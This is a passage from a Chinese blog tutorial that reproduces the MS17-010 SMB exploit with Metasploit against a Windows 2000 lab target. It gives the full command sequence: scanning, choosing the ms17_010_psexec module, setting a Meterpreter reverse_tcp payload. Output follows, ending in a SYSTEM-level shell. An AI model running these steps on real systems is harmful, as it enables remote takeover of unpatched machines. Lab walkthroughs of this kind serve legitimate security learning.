<p>那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个<a href="https://baike.baidu.com/item/linux/27050?fr=aladdin" target="_blank" rel="noopener noreffer">Linux</a>的渗透测试软件包。叫做<strong>Metasploit</strong>。 它在作为<strong>渗透测试的发行版</strong>中是自带的，如果你用的不是<strong>作为渗透测试的发行版</strong>，那么以下是安装方法：</p>
<ul>
<li>基于Arch</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>基于Debian更新源里有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt-get install metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>rpm系或deb系源里没有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo chmod <span class="m">755</span> msfinstall <span class="o">&amp;&amp;</span> ./msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Windows嘛….</li>
</ul>
<blockquote>
<p>两个选择</p>
<ul>
<li>请到<a href="https://www.metasploit.com/" target="_blank" rel="noopener noreffer">MSF官网</a>下载，并且耐心等待。</li>
<li><a href="/posts/linux_mint_%e5%ae%89%e8%a3%85%e6%95%99%e7%a8%8b/" rel="">出门左转</a>安装Linux</li>
</ul>
</blockquote>
<h2 id="复现过程">复现过程</h2>
<blockquote>
<p>重要的事情说三遍：</p>
<p>接下来就是最重要的一部分，你一定要认真看！认真看！认真看！</p>
</blockquote>
<h3 id="攻击环境">攻击环境</h3>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">攻击机</th>
<th style="text-align:center">靶机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:center">Arch Linux</td>
<td style="text-align:center">Windows2K</td>
</tr>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.42.141</td>
<td style="text-align:center">192.168.42.252</td>
</tr>
</tbody>
</table>
<p>靶机截图:</p>
<p></p>
<h3 id="攻击过程">攻击过程</h3>
<p>首先，攻击机打开终端，输入 <strong><code>msfconsole</code></strong> ，并按回车等待。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>建议加上<code>sudo</code>，以免出现未知错误。</p>
<p>稍等片刻，metasploit就打开了。如图</p>
<p></p>
<p>接下来，通过 <strong><code>search</code></strong> 命令本次要利用到的MS17_010模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; search ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就跳出一大堆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Matching Modules
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   #  Name                                           Disclosure Date  Rank     Check  Description
</span></span><span class="line"><span class="cl">   -  ----                                           ---------------  ----     -----  -----------
</span></span><span class="line"><span class="cl">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class="line"><span class="cl">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class="line"><span class="cl">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
</span></span><span class="line"><span class="cl">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<blockquote>
<p>顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：</p>
<ol>
<li>search</li>
</ol>
<ul>
<li>用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。</li>
</ul>
<ol start="2">
<li>info</li>
</ol>
<ul>
<li>显示该模块的详细信息。</li>
</ul>
<ol start="3">
<li>show + [option]</li>
</ol>
<ul>
<li>显示该模块的部分信息。</li>
</ul>
<ol start="4">
<li>show options</li>
</ol>
<ul>
<li>显示该模块需要设置的项目</li>
</ul>
<ol start="5">
<li>show payloads</li>
</ol>
<ul>
<li>显示该模块可使用的攻击载荷</li>
</ul>
<p><strong>注意，第三条和第四条不要搞混了，第二条那个[option]是指代。</strong></p>
</blockquote>
<hr>
<p>回归正题，我们先看看这个模块的信息。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后又出了一大堆qwq…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">    Name: MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">     Module: auxiliary/scanner/smb/smb_ms17_010
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  Sean Dillon &lt;sean.dillon@risksense.com&gt;
</span></span><span class="line"><span class="cl">  Luke Jennings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name         Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----         ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  CHECK_ARCH   true                                            no        Check for architecture on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_DOPU   true                                            no        Check for DOUBLEPULSAR on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_PIPE   false                                           no        Check for named pipe on vulnerable hosts
</span></span><span class="line"><span class="cl">  NAMED_PIPES  /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                       yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT        445                                             yes       The SMB service port (TCP)
</span></span><span class="line"><span class="cl">  SMBDomain    .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                      no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                      no        The username to authenticate as
</span></span><span class="line"><span class="cl">  THREADS      1                                               yes       The number of concurrent threads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  Uses information disclosure to determine if MS17-010 has been 
</span></span><span class="line"><span class="cl">  patched or not. Specifically, it connects to the IPC$ tree and 
</span></span><span class="line"><span class="cl">  attempts a transaction on FID 0. If the status returned is 
</span></span><span class="line"><span class="cl">  &#34;STATUS_INSUFF_SERVER_RESOURCES&#34;, the machine does not have the 
</span></span><span class="line"><span class="cl">  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
</span></span><span class="line"><span class="cl">  module will check for an existing DoublePulsar (ring 0 
</span></span><span class="line"><span class="cl">  shellcode/malware) infection. This module does not require valid SMB 
</span></span><span class="line"><span class="cl">  credentials in default server configurations. It can log on as the 
</span></span><span class="line"><span class="cl">  user &#34;\&#34; and connect to IPC$.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0144/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0145/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0148/
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
</span></span><span class="line"><span class="cl">  https://github.com/countercept/doublepulsar-detection-script
</span></span><span class="line"><span class="cl">  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  DOUBLEPULSAR
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而这里我们只需要看那个<strong>Basic options</strong>部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个<strong>目标IP(RHOST)</strong>，而那个 <strong>RPORT(目标端口)</strong> 已经被指定为445了。</p>
<p>接下来执行…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> rhost 192.168.42.252
</span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>返回后我们得到了这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 <span class="o">(</span>32-bit<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445    - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table>
</div>
</div><p>
说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。</p>
<blockquote>
<p>exploit/windows/smb/ms17_010_psexec</p>
</blockquote>
<p>那么，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; use exploit/windows/smb/ms17_010_psexec
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来msf5后面的模块就变成了攻击模块了。

然后继续执行info，没错，又会弹出一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>对，就是下面这一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class="line"><span class="cl">     Module: exploit/windows/smb/ms17_010_psexec
</span></span><span class="line"><span class="cl">   Platform: Windows
</span></span><span class="line"><span class="cl">       Arch: x86, x64
</span></span><span class="line"><span class="cl"> Privileged: No
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">  Disclosed: 2017-03-14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  sleepya
</span></span><span class="line"><span class="cl">  zerosum0x0
</span></span><span class="line"><span class="cl">  Shadow Brokers
</span></span><span class="line"><span class="cl">  Equation Group
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Available targets:
</span></span><span class="line"><span class="cl">  Id  Name
</span></span><span class="line"><span class="cl">  --  ----
</span></span><span class="line"><span class="cl">  0   Automatic
</span></span><span class="line"><span class="cl">  1   PowerShell
</span></span><span class="line"><span class="cl">  2   Native upload
</span></span><span class="line"><span class="cl">  3   MOF upload
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name                  Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----                  ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  DBGTRACE              false                                           yes       Show extra debug trace info
</span></span><span class="line"><span class="cl">  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
</span></span><span class="line"><span class="cl">  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
</span></span><span class="line"><span class="cl">  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                                yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT                 445                                             yes       The Target port
</span></span><span class="line"><span class="cl">  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
</span></span><span class="line"><span class="cl">  SERVICE_DISPLAY_NAME                                                  no        The service display name
</span></span><span class="line"><span class="cl">  SERVICE_NAME                                                          no        The service name
</span></span><span class="line"><span class="cl">  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span></span><span class="line"><span class="cl">  SMBDomain             .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                               no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                               no        The username to authenticate as
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload information:
</span></span><span class="line"><span class="cl">  Space: 3072
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  This module will exploit SMB with vulnerabilities in MS17-010 to 
</span></span><span class="line"><span class="cl">  achieve a write-what-where primitive. This will then be used to 
</span></span><span class="line"><span class="cl">  overwrite the connection session information with as an 
</span></span><span class="line"><span class="cl">  Administrator session. From there, the normal psexec payload code 
</span></span><span class="line"><span class="cl">  execution is done. Exploits a type confusion between Transaction and 
</span></span><span class="line"><span class="cl">  WriteAndX requests and a race condition in Transaction requests, as 
</span></span><span class="line"><span class="cl">  seen in the EternalRomance, EternalChampion, and EternalSynergy 
</span></span><span class="line"><span class="cl">  exploits. This exploit chain is more reliable than the EternalBlue 
</span></span><span class="line"><span class="cl">  exploit, but requires a named pipe.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://github.com/worawit/MS17-010
</span></span><span class="line"><span class="cl">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
</span></span><span class="line"><span class="cl">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  ETERNALSYNERGY
</span></span><span class="line"><span class="cl">  ETERNALROMANCE
</span></span><span class="line"><span class="cl">  ETERNALCHAMPION
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西</p>
<ul>
<li>RHOST，目标IP，目标的DHCP地址</li>
<li>LHOST，监听IP，一般是你自己的DHCP地址</li>
<li>LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。</li>
<li>payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。</li>
</ul>
<p>接下来就设置这四个东西吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 192.168.42.141
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">6666</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 192.168.42.252
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> payloads windows/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置完以后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> ，其实二者并没有什么区别，都是一样的。</p>
<p>喜欢哪个就用哪个吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.42.141:6666 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Target OS: Windows 5.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Filling barrel with fish... <span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Entering Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>*<span class="o">]</span> Preparing dynamite...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 		<span class="o">[</span>*<span class="o">]</span> Trying stick <span class="m">1</span> <span class="o">(</span>x86<span class="o">)</span>...Boom!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully Leaked Transaction!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully caught Fish-in-a-barrel
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Leaving Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Reading from CONNECTION struct at: 0x81382010
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Built a write-what-where primitive...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Overwrite complete... SYSTEM session obtained!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Selecting native target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Uploading payload... JmgBrDpV.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Created <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Service started successfully...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Deleting <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">179779</span> bytes<span class="o">)</span> to 192.168.42.252
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.42.141:6666 -&gt; 192.168.42.252:1027<span class="o">)</span> at 2019-07-26 23:11:38 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>截一张图吧

接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。</p>
<p>那么至少可以干点什么呢，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
